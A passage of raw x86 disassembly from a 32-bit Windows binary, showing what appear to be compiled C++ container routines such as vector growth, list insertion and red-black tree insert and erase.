   1ac22:	lea    ecx,[edx+ecx*4-0x4]
   1ac26:	cmp    eax,ecx
   1ac28:	jae    0x1ac38
   1ac2a:	add    eax,0x4
   1ac2d:	mov    DWORD PTR [ebx+0x20],eax
   1ac30:	mov    DWORD PTR [eax],esi
   1ac32:	push   DWORD PTR [ebx+0x20]
   1ac35:	push   esi
   1ac36:	jmp    0x1ac6f
   1ac38:	sub    eax,DWORD PTR [ebx+0x10]
   1ac3b:	mov    ecx,ebx
   1ac3d:	sar    eax,0x2
   1ac40:	inc    eax
   1ac41:	mov    edi,eax
   1ac43:	lea    eax,[edi+edi*1]
   1ac46:	push   eax
   1ac47:	call   0x1aa4e
   1ac4c:	lea    ecx,[eax+edi*4]
   1ac4f:	mov    DWORD PTR [ecx],esi
   1ac51:	push   eax
   1ac52:	push   DWORD PTR [ebx+0xc]
   1ac55:	mov    DWORD PTR [ebp-0x4],ecx
   1ac58:	lea    ecx,[ebp-0x18]
   1ac5b:	call   0x1a362
   1ac60:	push   DWORD PTR [ebp-0x4]
   1ac63:	lea    edi,[ebx+0x4]
   1ac66:	push   DWORD PTR [ebp-0x8]
   1ac69:	mov    esi,eax
   1ac6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac6f:	lea    ecx,[ebp-0x18]
   1ac72:	call   0x1a362
   1ac77:	lea    edi,[ebx+0x14]
   1ac7a:	mov    esi,eax
   1ac7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac80:	pop    edi
   1ac81:	pop    esi
   1ac82:	pop    ebx
   1ac83:	leave  
   1ac84:	ret    
   1ac85:	int3   
   1ac86:	int3   
   1ac87:	int3   
   1ac88:	int3   
   1ac89:	int3   
   1ac8a:	mov    edi,edi
   1ac8c:	push   ebp
   1ac8d:	mov    ebp,esp
   1ac8f:	mov    eax,DWORD PTR [ebp+0xc]
   1ac92:	push   ebx
   1ac93:	push   esi
   1ac94:	push   edi
   1ac95:	lea    edi,[eax+0x4]
   1ac98:	push   DWORD PTR [edi]
   1ac9a:	mov    ebx,ecx
   1ac9c:	push   eax
   1ac9d:	call   0x1aa02
   1aca2:	push   DWORD PTR [ebp+0x10]
   1aca5:	mov    esi,eax
   1aca7:	mov    DWORD PTR [edi],esi
   1aca9:	mov    eax,DWORD PTR [esi+0x4]
   1acac:	mov    DWORD PTR [eax],esi
   1acae:	lea    eax,[esi+0x8]
   1acb1:	push   eax
   1acb2:	call   0x1163a
   1acb7:	mov    eax,DWORD PTR [ebp+0x8]
   1acba:	inc    DWORD PTR [ebx+0x8]
   1acbd:	pop    edi
   1acbe:	mov    DWORD PTR [eax],esi
   1acc0:	pop    esi
   1acc1:	pop    ebx
   1acc2:	pop    ebp
   1acc3:	ret    0xc
   1acc6:	int3   
   1acc7:	int3   
   1acc8:	int3   
   1acc9:	int3   
   1acca:	int3   
   1accb:	int3   
   1accc:	mov    edi,edi
   1acce:	push   ebp
   1accf:	mov    ebp,esp
   1acd1:	push   ecx
   1acd2:	mov    eax,DWORD PTR [ebp+0xc]
   1acd5:	push   esi
   1acd6:	mov    esi,ecx
   1acd8:	jmp    0x1acf4
   1acda:	add    eax,0x8
   1acdd:	push   eax
   1acde:	push   DWORD PTR [ebp+0x8]
   1ace1:	lea    eax,[ebp-0x4]
   1ace4:	push   eax
   1ace5:	mov    ecx,esi
   1ace7:	call   0x1ac8a
   1acec:	mov    eax,DWORD PTR [ebp+0xc]
   1acef:	mov    eax,DWORD PTR [eax]
   1acf1:	mov    DWORD PTR [ebp+0xc],eax
   1acf4:	cmp    eax,DWORD PTR [ebp+0x10]
   1acf7:	jne    0x1acda
   1acf9:	pop    esi
   1acfa:	leave  
   1acfb:	ret    0xc
   1acfe:	int3   
   1acff:	int3   
   1ad00:	int3   
   1ad01:	int3   
   1ad02:	int3   
   1ad03:	int3   
   1ad04:	mov    edi,edi
   1ad06:	push   ebp
   1ad07:	mov    ebp,esp
   1ad09:	push   esi
   1ad0a:	push   edi
   1ad0b:	push   DWORD PTR [ebp+0xc]
   1ad0e:	mov    edi,ecx
   1ad10:	call   0x1a642
   1ad15:	push   DWORD PTR [ebp+0xc]
   1ad18:	mov    ecx,edi
   1ad1a:	mov    esi,eax
   1ad1c:	call   0x1a602
   1ad21:	mov    ecx,DWORD PTR [ebp+0x8]
   1ad24:	pop    edi
   1ad25:	mov    DWORD PTR [ecx],eax
   1ad27:	mov    DWORD PTR [ecx+0x4],esi
   1ad2a:	mov    eax,ecx
   1ad2c:	pop    esi
   1ad2d:	pop    ebp
   1ad2e:	ret    0x8
   1ad31:	int3   
   1ad32:	int3   
   1ad33:	int3   
   1ad34:	int3   
   1ad35:	int3   
   1ad36:	mov    edi,edi
   1ad38:	push   ebp
   1ad39:	mov    ebp,esp
   1ad3b:	push   ecx
   1ad3c:	push   ebx
   1ad3d:	push   esi
   1ad3e:	push   edi
   1ad3f:	push   0x1
   1ad41:	xor    edi,edi
   1ad43:	push   edi
   1ad44:	mov    esi,ecx
   1ad46:	call   0x1395c
   1ad4b:	lea    ecx,[ebp-0x1]
   1ad4e:	mov    ebx,eax
   1ad50:	call   DWORD PTR ds:0x7dedc
   1ad56:	cmp    DWORD PTR ds:0x7f89c,edi
   1ad5c:	jne    0x1ad71
   1ad5e:	mov    eax,ebx
   1ad60:	mov    ds:0x7f89c,eax
   1ad65:	mov    DWORD PTR [eax],edi
   1ad67:	mov    eax,ds:0x7f89c
   1ad6c:	xor    ebx,ebx
   1ad6e:	mov    DWORD PTR [eax+0x8],edi
   1ad71:	inc    DWORD PTR ds:0x7f8a0
   1ad77:	lea    ecx,[ebp-0x1]
   1ad7a:	call   DWORD PTR ds:0x7ded8
   1ad80:	cmp    ebx,edi
   1ad82:	je     0x1ad8b
   1ad84:	push   ebx
   1ad85:	call   0x10a9a
   1ad8a:	pop    ecx
   1ad8b:	push   edi
   1ad8c:	push   DWORD PTR ds:0x7f89c
   1ad92:	mov    ecx,esi
   1ad94:	call   0x1395c
   1ad99:	mov    DWORD PTR [esi+0xc],edi
   1ad9c:	mov    DWORD PTR [esi+0x4],eax
   1ad9f:	mov    DWORD PTR [eax],eax
   1ada1:	mov    esi,DWORD PTR [esi+0x4]
   1ada4:	pop    edi
   1ada5:	mov    DWORD PTR [esi+0x8],esi
   1ada8:	pop    esi
   1ada9:	pop    ebx
   1adaa:	leave  
   1adab:	ret    
   1adac:	int3   
   1adad:	int3   
   1adae:	int3   
   1adaf:	int3   
   1adb0:	int3   
   1adb1:	int3   
   1adb2:	mov    edi,edi
   1adb4:	push   ebp
   1adb5:	mov    ebp,esp
   1adb7:	push   ebx
   1adb8:	push   esi
   1adb9:	mov    esi,DWORD PTR [ebp+0x10]
   1adbc:	push   edi
   1adbd:	push   0x0
   1adbf:	push   esi
   1adc0:	mov    edi,ecx
   1adc2:	call   0x1395c
   1adc7:	push   DWORD PTR [ebp+0x14]
   1adca:	mov    ebx,eax
   1adcc:	mov    eax,ds:0x7f89c
   1add1:	mov    DWORD PTR [ebx],eax
   1add3:	mov    eax,ds:0x7f89c
   1add8:	mov    DWORD PTR [ebx+0x8],eax
   1addb:	lea    eax,[ebx+0xc]
   1adde:	push   eax
   1addf:	call   0x1a682
   1ade4:	inc    DWORD PTR [edi+0xc]
   1ade7:	cmp    esi,DWORD PTR [edi+0x4]
   1adea:	je     0x1ae14
   1adec:	mov    eax,DWORD PTR [ebp+0xc]
   1adef:	cmp    eax,DWORD PTR ds:0x7f89c
   1adf5:	jne    0x1ae14
   1adf7:	lea    eax,[esi+0xc]
   1adfa:	push   eax
   1adfb:	push   DWORD PTR [ebp+0x14]
   1adfe:	call   0x19804
   1ae03:	test   al,al
   1ae05:	jne    0x1ae14
   1ae07:	mov    DWORD PTR [esi+0x8],ebx
   1ae0a:	mov    eax,DWORD PTR [edi+0x4]
   1ae0d:	cmp    esi,DWORD PTR [eax+0x8]
   1ae10:	jne    0x1ae2e
   1ae12:	jmp    0x1ae23
   1ae14:	mov    DWORD PTR [esi],ebx
   1ae16:	mov    eax,DWORD PTR [edi+0x4]
   1ae19:	cmp    esi,eax
   1ae1b:	jne    0x1ae28
   1ae1d:	mov    DWORD PTR [eax+0x4],ebx
   1ae20:	mov    eax,DWORD PTR [edi+0x4]
   1ae23:	mov    DWORD PTR [eax+0x8],ebx
   1ae26:	jmp    0x1ae2e
   1ae28:	cmp    esi,DWORD PTR [eax]
   1ae2a:	jne    0x1ae2e
   1ae2c:	mov    DWORD PTR [eax],ebx
   1ae2e:	mov    eax,DWORD PTR [edi+0x4]
   1ae31:	mov    esi,ebx
   1ae33:	cmp    ebx,DWORD PTR [eax+0x4]
   1ae36:	je     0x1aeea
   1ae3c:	mov    eax,DWORD PTR [esi+0x4]
   1ae3f:	xor    edx,edx
   1ae41:	cmp    DWORD PTR [eax+0x14],edx
   1ae44:	jne    0x1aeea
   1ae4a:	mov    ecx,DWORD PTR [eax+0x4]
   1ae4d:	cmp    eax,DWORD PTR [ecx]
   1ae4f:	jne    0x1ae8b
   1ae51:	mov    ecx,DWORD PTR [ecx+0x8]
   1ae54:	cmp    DWORD PTR [ecx+0x14],edx
   1ae57:	je     0x1ae92
   1ae59:	cmp    esi,DWORD PTR [eax+0x8]
   1ae5c:	jne    0x1ae68
   1ae5e:	mov    esi,eax
   1ae60:	push   esi
   1ae61:	mov    ecx,edi
   1ae63:	call   0x1a524
   1ae68:	mov    eax,DWORD PTR [esi+0x4]
   1ae6b:	mov    DWORD PTR [eax+0x14],0x1
   1ae72:	mov    eax,DWORD PTR [esi+0x4]
   1ae75:	mov    eax,DWORD PTR [eax+0x4]
   1ae78:	and    DWORD PTR [eax+0x14],0x0
   1ae7c:	mov    eax,DWORD PTR [esi+0x4]
   1ae7f:	push   DWORD PTR [eax+0x4]
   1ae82:	mov    ecx,edi
   1ae84:	call   0x1a572
   1ae89:	jmp    0x1aede
   1ae8b:	mov    ecx,DWORD PTR [ecx]
   1ae8d:	cmp    DWORD PTR [ecx+0x14],edx
   1ae90:	jne    0x1aeaf
   1ae92:	mov    edx,eax
   1ae94:	xor    eax,eax
   1ae96:	inc    eax
   1ae97:	mov    DWORD PTR [edx+0x14],eax
   1ae9a:	mov    DWORD PTR [ecx+0x14],eax
   1ae9d:	mov    eax,DWORD PTR [esi+0x4]
   1aea0:	mov    eax,DWORD PTR [eax+0x4]
   1aea3:	and    DWORD PTR [eax+0x14],0x0
   1aea7:	mov    eax,DWORD PTR [esi+0x4]
   1aeaa:	mov    esi,DWORD PTR [eax+0x4]
   1aead:	jmp    0x1aede
   1aeaf:	cmp    esi,DWORD PTR [eax]
   1aeb1:	jne    0x1aebd
   1aeb3:	mov    esi,eax
   1aeb5:	push   esi
   1aeb6:	mov    ecx,edi
   1aeb8:	call   0x1a572
   1aebd:	mov    eax,DWORD PTR [esi+0x4]
   1aec0:	mov    DWORD PTR [eax+0x14],0x1
   1aec7:	mov    eax,DWORD PTR [esi+0x4]
   1aeca:	mov    eax,DWORD PTR [eax+0x4]
   1aecd:	and    DWORD PTR [eax+0x14],0x0
   1aed1:	mov    eax,DWORD PTR [esi+0x4]
   1aed4:	push   DWORD PTR [eax+0x4]
   1aed7:	mov    ecx,edi
   1aed9:	call   0x1a524
   1aede:	mov    eax,DWORD PTR [edi+0x4]
   1aee1:	cmp    esi,DWORD PTR [eax+0x4]
   1aee4:	jne    0x1ae3c
   1aeea:	mov    eax,DWORD PTR [edi+0x4]
   1aeed:	mov    eax,DWORD PTR [eax+0x4]
   1aef0:	pop    edi
   1aef1:	mov    DWORD PTR [eax+0x14],0x1
   1aef8:	mov    eax,DWORD PTR [ebp+0x8]
   1aefb:	pop    esi
   1aefc:	mov    DWORD PTR [eax],ebx
   1aefe:	pop    ebx
   1aeff:	pop    ebp
   1af00:	ret    0x10
   1af03:	int3   
   1af04:	int3   
   1af05:	int3   
   1af06:	int3   
   1af07:	int3   
   1af08:	mov    edi,edi
   1af0a:	push   ebp
   1af0b:	mov    ebp,esp
   1af0d:	sub    esp,0x10
   1af10:	push   ebx
   1af11:	push   esi
   1af12:	mov    DWORD PTR [ebp-0xc],ecx
   1af15:	push   edi
   1af16:	mov    edi,DWORD PTR [ebp+0xc]
   1af19:	lea    ecx,[ebp+0xc]
   1af1c:	call   0x1a3d2
   1af21:	mov    esi,DWORD PTR [edi]
   1af23:	mov    eax,ds:0x7f89c
   1af28:	lea    ebx,[edi+0x8]
   1af2b:	mov    DWORD PTR [ebp-0x8],edi
   1af2e:	mov    DWORD PTR [ebp-0x10],ebx
   1af31:	cmp    esi,eax
   1af33:	jne    0x1af39
   1af35:	mov    esi,DWORD PTR [ebx]
   1af37:	jmp    0x1af50
   1af39:	mov    ecx,DWORD PTR [ebx]
   1af3b:	cmp    ecx,eax
   1af3d:	je     0x1af50
   1af3f:	push   ecx
   1af40:	call   0x1a3b0
   1af45:	mov    DWORD PTR [ebp-0x8],eax
   1af48:	add    eax,0x8
   1af4b:	mov    esi,DWORD PTR [eax]
   1af4d:	mov    DWORD PTR [ebp-0x10],eax
   1af50:	lea    ecx,[ebp-0x1]
   1af53:	call   DWORD PTR ds:0x7dedc
   1af59:	mov    eax,DWORD PTR [ebp-0x8]
   1af5c:	cmp    eax,edi
   1af5e:	je     0x1afc0
   1af60:	mov    ecx,DWORD PTR [edi]
   1af62:	mov    DWORD PTR [ecx+0x4],eax
   1af65:	mov    ecx,DWORD PTR [edi]
   1af67:	mov    DWORD PTR [eax],ecx
   1af69:	cmp    eax,DWORD PTR [ebx]
   1af6b:	jne    0x1af72
   1af6d:	mov    DWORD PTR [esi+0x4],eax
   1af70:	jmp    0x1af89
   1af72:	mov    ecx,DWORD PTR [eax+0x4]
   1af75:	mov    edx,DWORD PTR [ebp-0x10]
   1af78:	mov    DWORD PTR [esi+0x4],ecx
   1af7b:	mov    ecx,DWORD PTR [eax+0x4]
   1af7e:	mov    DWORD PTR [ecx],esi
   1af80:	mov    ecx,DWORD PTR [ebx]
   1af82:	mov    DWORD PTR [edx],ecx
   1af84:	mov    ecx,DWORD PTR [ebx]
   1af86:	mov    DWORD PTR [ecx+0x4],eax
   1af89:	mov    ebx,DWORD PTR [ebp-0xc]
   1af8c:	mov    ecx,DWORD PTR [ebx+0x4]
   1af8f:	cmp    DWORD PTR [ecx+0x4],edi
   1af92:	jne    0x1af99
   1af94:	mov    DWORD PTR [ecx+0x4],eax
   1af97:	jmp    0x1afa7
   1af99:	mov    ecx,DWORD PTR [edi+0x4]
   1af9c:	cmp    DWORD PTR [ecx],edi
   1af9e:	jne    0x1afa4
   1afa0:	mov    DWORD PTR [ecx],eax
   1afa2:	jmp    0x1afa7
   1afa4:	mov    DWORD PTR [ecx+0x8],eax
   1afa7:	mov    ecx,DWORD PTR [edi+0x4]
   1afaa:	mov    DWORD PTR [eax+0x4],ecx
   1afad:	mov    ecx,DWORD PTR [eax+0x14]
   1afb0:	mov    edx,DWORD PTR [edi+0x14]
   1afb3:	mov    DWORD PTR [eax+0x14],edx
   1afb6:	mov    DWORD PTR [edi+0x14],ecx
   1afb9:	mov    DWORD PTR [ebp-0x8],edi
   1afbc:	mov    eax,edi
   1afbe:	jmp    0x1b039
   1afc0:	mov    ecx,DWORD PTR [eax+0x4]
   1afc3:	mov    edx,DWORD PTR [ebp-0xc]
   1afc6:	mov    DWORD PTR [esi+0x4],ecx
   1afc9:	mov    ecx,DWORD PTR [edx+0x4]
   1afcc:	cmp    DWORD PTR [ecx+0x4],edi
   1afcf:	jne    0x1afd6
   1afd1:	mov    DWORD PTR [ecx+0x4],esi
   1afd4:	jmp    0x1afe4
   1afd6:	mov    ecx,DWORD PTR [edi+0x4]
   1afd9:	cmp    DWORD PTR [ecx],edi
   1afdb:	jne    0x1afe1
   1afdd:	mov    DWORD PTR [ecx],esi
   1afdf:	jmp    0x1afe4
   1afe1:	mov    DWORD PTR [ecx+0x8],esi
   1afe4:	mov    ecx,DWORD PTR [edx+0x4]
   1afe7:	mov    DWORD PTR [ebp-0x10],ecx
   1afea:	cmp    DWORD PTR [ecx],edi
   1afec:	jne    0x1b010
   1afee:	mov    ebx,DWORD PTR [ebx]
   1aff0:	cmp    ebx,DWORD PTR ds:0x7f89c
   1aff6:	jne    0x1afff
   1aff8:	mov    ebx,DWORD PTR [edi+0x4]
   1affb:	mov    DWORD PTR [ecx],ebx
   1affd:	jmp    0x1b010
   1afff:	push   esi
   1b000:	call   0x1a3b0
   1b005:	mov    ecx,DWORD PTR [ebp-0x10]
   1b008:	mov    edx,DWORD PTR [ebp-0xc]
   1b00b:	mov    DWORD PTR [ecx],eax
   1b00d:	mov    eax,DWORD PTR [ebp-0x8]
   1b010:	mov    ebx,DWORD PTR [edx+0x4]
   1b013:	cmp    DWORD PTR [ebx+0x8],edi
   1b016:	jne    0x1b036
   1b018:	mov    ecx,DWORD PTR [edi]
   1b01a:	cmp    ecx,DWORD PTR ds:0x7f89c
   1b020:	jne    0x1b02a
   1b022:	mov    ecx,DWORD PTR [edi+0x4]
   1b025:	mov    DWORD PTR [ebx+0x8],ecx
   1b028:	jmp    0x1b036
   1b02a:	push   esi
   1b02b:	call   0x1a38e
   1b030:	mov    DWORD PTR [ebx+0x8],eax
   1b033:	mov    eax,DWORD PTR [ebp-0x8]
   1b036:	mov    ebx,DWORD PTR [ebp-0xc]
   1b039:	xor    edi,edi
   1b03b:	inc    edi
   1b03c:	cmp    DWORD PTR [eax+0x14],edi
   1b03f:	jne    0x1b153
   1b045:	jmp    0x1b106
   1b04a:	cmp    DWORD PTR [esi+0x14],edi
   1b04d:	jne    0x1b150
   1b053:	mov    eax,DWORD PTR [esi+0x4]
   1b056:	cmp    esi,DWORD PTR [eax]
   1b058:	jne    0x1b0cf
   1b05a:	mov    eax,DWORD PTR [eax+0x8]
   1b05d:	cmp    DWORD PTR [eax+0x14],0x0
   1b061:	jne    0x1b07d
   1b063:	mov    DWORD PTR [eax+0x14],edi
   1b066:	mov    eax,DWORD PTR [esi+0x4]
   1b069:	and    DWORD PTR [eax+0x14],0x0
   1b06d:	push   DWORD PTR [esi+0x4]
   1b070:	mov    ecx,ebx
   1b072:	call   0x1a524
   1b077:	mov    eax,DWORD PTR [esi+0x4]
   1b07a:	mov    eax,DWORD PTR [eax+0x8]
   1b07d:	mov    ecx,DWORD PTR [eax]
   1b07f:	cmp    DWORD PTR [ecx+0x14],edi
   1b082:	jne    0x1b08c
   1b084:	mov    ecx,DWORD PTR [eax+0x8]
   1b087:	cmp    DWORD PTR [ecx+0x14],edi
   1b08a:	je     0x1b0ff
   1b08c:	mov    ecx,DWORD PTR [eax+0x8]
   1b08f:	cmp    DWORD PTR [ecx+0x14],edi
   1b092:	jne    0x1b0ab
   1b094:	mov    ecx,DWORD PTR [eax]
   1b096:	mov    DWORD PTR [ecx+0x14],edi
   1b099:	and    DWORD PTR [eax+0x14],0x0
   1b09d:	push   eax
   1b09e:	mov    ecx,ebx
   1b0a0:	call   0x1a572
   1b0a5:	mov    eax,DWORD PTR [esi+0x4]
   1b0a8:	mov    eax,DWORD PTR [eax+0x8]
   1b0ab:	mov    ecx,DWORD PTR [esi+0x4]
   1b0ae:	mov    ecx,DWORD PTR [ecx+0x14]
   1b0b1:	mov    DWORD PTR [eax+0x14],ecx
   1b0b4:	mov    ecx,DWORD PTR [esi+0x4]
   1b0b7:	mov    DWORD PTR [ecx+0x14],edi
   1b0ba:	mov    eax,DWORD PTR [eax+0x8]
   1b0bd:	mov    DWORD PTR [eax+0x14],edi
   1b0c0:	push   DWORD PTR [esi+0x4]
   1b0c3:	mov    ecx,ebx
   1b0c5:	call   0x1a524
   1b0ca:	jmp    0x1b150
   1b0cf:	mov    eax,DWORD PTR [eax]
   1b0d1:	cmp    DWORD PTR [eax+0x14],0x0
   1b0d5:	jne    0x1b0f0
   1b0d7:	mov    DWORD PTR [eax+0x14],edi
   1b0da:	mov    eax,DWORD PTR [esi+0x4]
   1b0dd:	and    DWORD PTR [eax+0x14],0x0
   1b0e1:	push   DWORD PTR [esi+0x4]
   1b0e4:	mov    ecx,ebx
   1b0e6:	call   0x1a572
   1b0eb:	mov    eax,DWORD PTR [esi+0x4]
   1b0ee:	mov    eax,DWORD PTR [eax]
   1b0f0:	mov    ecx,DWORD PTR [eax+0x8]
   1b0f3:	cmp    DWORD PTR [ecx+0x14],edi
   1b0f6:	jne    0x1b114
   1b0f8:	mov    ecx,DWORD PTR [eax]
   1b0fa:	cmp    DWORD PTR [ecx+0x14],edi
   1b0fd:	jne    0x1b114
   1b0ff:	and    DWORD PTR [eax+0x14],0x0
   1b103:	mov    esi,DWORD PTR [esi+0x4]
   1b106:	mov    eax,DWORD PTR [ebx+0x4]
   1b109:	cmp    esi,DWORD PTR [eax+0x4]
   1b10c:	jne    0x1b04a
   1b112:	jmp    0x1b150
   1b114:	mov    ecx,DWORD PTR [eax]
   1b116:	cmp    DWORD PTR [ecx+0x14],edi
   1b119:	jne    0x1b132
   1b11b:	mov    ecx,DWORD PTR [eax+0x8]
   1b11e:	mov    DWORD PTR [ecx+0x14],edi
   1b121:	and    DWORD PTR [eax+0x14],0x0
   1b125:	push   eax
   1b126:	mov    ecx,ebx
   1b128:	call   0x1a524
   1b12d:	mov    eax,DWORD PTR [esi+0x4]
   1b130:	mov    eax,DWORD PTR [eax]
   1b132:	mov    ecx,DWORD PTR [esi+0x4]
   1b135:	mov    ecx,DWORD PTR [ecx+0x14]
   1b138:	mov    DWORD PTR [eax+0x14],ecx
   1b13b:	mov    ecx,DWORD PTR [esi+0x4]
   1b13e:	mov    DWORD PTR [ecx+0x14],edi
   1b141:	mov    eax,DWORD PTR [eax]
   1b143:	mov    DWORD PTR [eax+0x14],edi
   1b146:	push   DWORD PTR [esi+0x4]
   1b149:	mov    ecx,ebx
   1b14b:	call   0x1a572
   1b150:	mov    DWORD PTR [esi+0x14],edi
   1b153:	lea    ecx,[ebp-0x1]
   1b156:	call   DWORD PTR ds:0x7ded8
   1b15c:	mov    esi,DWORD PTR [ebp-0x8]
   1b15f:	lea    eax,[esi+0xc]
   1b162:	push   eax
   1b163:	call   0x1a6a0
   1b168:	push   esi
   1b169:	call   0x10a9a
   1b16e:	mov    eax,DWORD PTR [ebp+0x8]
   1b171:	dec    DWORD PTR [ebx+0xc]
   1b174:	pop    ecx
   1b175:	mov    ecx,DWORD PTR [ebp+0xc]
   1b178:	pop    edi
   1b179:	pop    esi
   1b17a:	mov    DWORD PTR [eax],ecx
   1b17c:	pop    ebx
   1b17d:	leave  
   1b17e:	ret    0x8
   1b181:	int3   
   1b182:	int3   
   1b183:	int3   
   1b184:	int3   
   1b185:	int3   
   1b186:	mov    edi,edi
   1b188:	push   ebp
   1b189:	mov    ebp,esp
   1b18b:	push   ebx
   1b18c:	push   esi
   1b18d:	push   edi
   1b18e:	mov    edi,DWORD PTR [ebp+0x8]
   1b191:	mov    ebx,ecx
   1b193:	mov    esi,edi
   1b195:	cmp    edi,DWORD PTR ds:0x7f89c
   1b19b:	je     0x1b1c3
   1b19d:	push   DWORD PTR [esi+0x8]
   1b1a0:	mov    ecx,ebx
   1b1a2:	call   0x1b186
   1b1a7:	mov    esi,DWORD PTR [esi]
   1b1a9:	lea    eax,[edi+0xc]
   1b1ac:	push   eax
   1b1ad:	call   0x1a6a0
   1b1b2:	push   edi
   1b1b3:	call   0x10a9a
   1b1b8:	pop    ecx
   1b1b9:	mov    edi,esi
   1b1bb:	cmp    esi,DWORD PTR ds:0x7f89c
   1b1c1:	jne    0x1b19d
   1b1c3:	pop    edi
   1b1c4:	pop    esi
   1b1c5:	pop    ebx
   1b1c6:	pop    ebp
   1b1c7:	ret    0x4
   1b1ca:	int3   
   1b1cb:	int3   
   1b1cc:	int3   
   1b1cd:	int3   
   1b1ce:	int3   
   1b1cf:	int3   
   1b1d0:	mov    edi,edi
   1b1d2:	push   esi
   1b1d3:	mov    esi,ecx
   1b1d5:	jmp    0x1b1de
   1b1d7:	mov    ecx,esi
   1b1d9:	call   0x1ab2e
   1b1de:	cmp    DWORD PTR [esi+0x2c],0x0
   1b1e2:	jne    0x1b1d7
   1b1e4:	pop    esi
   1b1e5:	ret    
   1b1e6:	int3   
   1b1e7:	int3   
   1b1e8:	int3   
   1b1e9:	int3   
   1b1ea:	int3   
   1b1eb:	int3   
   1b1ec:	mov    edi,edi
   1b1ee:	push   ebp
   1b1ef:	mov    ebp,esp
   1b1f1:	push   esi
   1b1f2:	mov    esi,ecx
   1b1f4:	cmp    DWORD PTR [esi+0x2c],0x0
   1b1f8:	je     0x1b220
   1b1fa:	mov    ecx,DWORD PTR [esi+0x1c]
   1b1fd:	mov    edx,DWORD PTR [esi+0x18]
   1b200:	cmp    ecx,edx
   1b202:	je     0x1b220
   1b204:	push   DWORD PTR [ebp+0x8]
   1b207:	lea    eax,[ecx+0x4]
   1b20a:	mov    DWORD PTR [esi+0x1c],eax
   1b20d:	push   ecx
   1b20e:	cmp    eax,edx
   1b210:	jne    0x1b234
   1b212:	call   0x1163a
   1b217:	mov    ecx,esi
   1b219:	call   0x1abc0
   1b21e:	jmp    0x1b239
   1b220:	mov    ecx,esi
   1b222:	call   0x1abc0
   1b227:	mov    eax,DWORD PTR [esi+0x1c]
   1b22a:	push   DWORD PTR [ebp+0x8]
   1b22d:	lea    ecx,[eax+0x4]
   1b230:	mov    DWORD PTR [esi+0x1c],ecx
   1b233:	push   eax
   1b234:	call   0x1163a
   1b239:	inc    DWORD PTR [esi+0x2c]
   1b23c:	pop    esi
   1b23d:	pop    ebp
   1b23e:	ret    0x4
   1b241:	int3   
   1b242:	int3   
   1b243:	int3   
   1b244:	int3   
   1b245:	int3   
   1b246:	mov    edi,edi
   1b248:	push   ebp
   1b249:	mov    ebp,esp
   1b24b:	push   esi
   1b24c:	push   0x0
   1b24e:	push   0xc
   1b250:	mov    esi,ecx
   1b252:	call   0x11618
   1b257:	mov    ecx,DWORD PTR [ebp+0x8]
   1b25a:	mov    DWORD PTR [eax],eax
   1b25c:	mov    DWORD PTR [eax+0x4],eax
   1b25f:	and    DWORD PTR [esi+0x8],0x0
   1b263:	mov    DWORD PTR [esi+0x4],eax
   1b266:	mov    ecx,DWORD PTR [ecx+0x4]
   1b269:	mov    edx,DWORD PTR [ecx]
   1b26b:	mov    eax,DWORD PTR [eax]
   1b26d:	push   ecx
   1b26e:	push   edx
   1b26f:	push   eax
   1b270:	mov    ecx,esi
   1b272:	call   0x1accc
   1b277:	mov    eax,esi
   1b279:	pop    esi
   1b27a:	pop    ebp
   1b27b:	ret    0x4
   1b27e:	int3   
   1b27f:	int3   
   1b280:	int3   
   1b281:	int3   
   1b282:	int3   
   1b283:	int3   
   1b284:	mov    edi,edi
   1b286:	push   ebp
   1b287:	mov    ebp,esp
   1b289:	push   ecx
   1b28a:	mov    edx,DWORD PTR [ebp+0x8]
   1b28d:	mov    DWORD PTR [ebp-0x4],ecx
   1b290:	cmp    ecx,edx
   1b292:	je     0x1b2d1
   1b294:	push   ebx
   1b295:	mov    ebx,DWORD PTR [edx+0x4]
   1b298:	push   esi
   1b299:	mov    esi,DWORD PTR [ecx+0x4]
   1b29c:	mov    eax,DWORD PTR [esi]
   1b29e:	push   edi
   1b29f:	mov    edi,DWORD PTR [ebx]
   1b2a1:	jmp    0x1b2b1
   1b2a3:	cmp    edi,ebx
   1b2a5:	je     0x1b2b5
   1b2a7:	mov    edx,DWORD PTR [edi+0x8]
   1b2aa:	mov    DWORD PTR [eax+0x8],edx
   1b2ad:	mov    eax,DWORD PTR [eax]
   1b2af:	mov    edi,DWORD PTR [edi]
   1b2b1:	cmp    eax,esi
   1b2b3:	jne    0x1b2a3
   1b2b5:	push   esi
   1b2b6:	push   eax
   1b2b7:	lea    eax,[ebp+0x8]
   1b2ba:	push   eax
   1b2bb:	call   0x1a9cc
   1b2c0:	mov    ecx,DWORD PTR [ebp-0x4]
   1b2c3:	push   ebx
   1b2c4:	push   edi
   1b2c5:	push   esi
   1b2c6:	call   0x1accc
   1b2cb:	mov    ecx,DWORD PTR [ebp-0x4]
   1b2ce:	pop    edi
   1b2cf:	pop    esi
   1b2d0:	pop    ebx
   1b2d1:	mov    eax,ecx
   1b2d3:	leave  
   1b2d4:	ret    0x4
   1b2d7:	int3   
   1b2d8:	int3   
   1b2d9:	int3   
   1b2da:	int3   
   1b2db:	int3   
   1b2dc:	mov    edi,edi
   1b2de:	push   ebp
   1b2df:	mov    ebp,esp
   1b2e1:	push   DWORD PTR [ebp+0x8]
   1b2e4:	mov    eax,DWORD PTR [ecx+0x4]
   1b2e7:	push   eax
   1b2e8:	lea    eax,[ebp+0x8]
   1b2eb:	push   eax
   1b2ec:	call   0x1ac8a
   1b2f1:	pop    ebp
   1b2f2:	ret    0x4
   1b2f5:	int3   
   1b2f6:	int3   
   1b2f7:	int3   
   1b2f8:	int3   
   1b2f9:	int3   
   1b2fa:	mov    edi,edi
   1b2fc:	push   ebp
   1b2fd:	mov    ebp,esp
   1b2ff:	push   ecx
   1b300:	push   ebx
   1b301:	push   esi
   1b302:	push   edi
   1b303:	mov    edi,ecx
   1b305:	mov    eax,DWORD PTR [edi+0x4]
   1b308:	mov    esi,DWORD PTR [eax+0x4]
   1b30b:	mov    ebx,eax
   1b30d:	mov    al,0x1
   1b30f:	jmp    0x1b32a
